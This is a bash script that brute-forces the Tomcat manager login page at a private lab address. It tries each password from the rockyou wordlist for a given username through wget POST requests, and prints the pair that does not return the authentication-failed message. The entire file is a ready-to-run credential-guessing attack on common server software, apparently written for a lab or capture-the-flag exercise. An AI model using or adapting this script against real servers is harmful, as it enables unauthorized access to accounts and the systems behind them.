#!/bin/bash

if [ $# -eq 0 ];
then
	echo "- Invalid number of arguments"
	echo "	$0 username"
	exit;
fi

passwordfile="/usr/share/wordlists/rockyou.txt"
url="http://10.0.2.15:8080/manager/html"
username=$1

while read password;
do
	commands="$url --post-data \"j_username=$username&j_password=$password\""
	echo $commands

	timeout 2 wget $commands 2>&1 | tr "\n" " " | grep -v "Username/Password Authentication Failed" > output.txt
	lines=$(wc -l output.txt | awk '{print $1}')

	if [ $lines != "0" ];
	then
		echo credentials found "$username" / "$password"
		exit;
	fi
done < $passwordfile
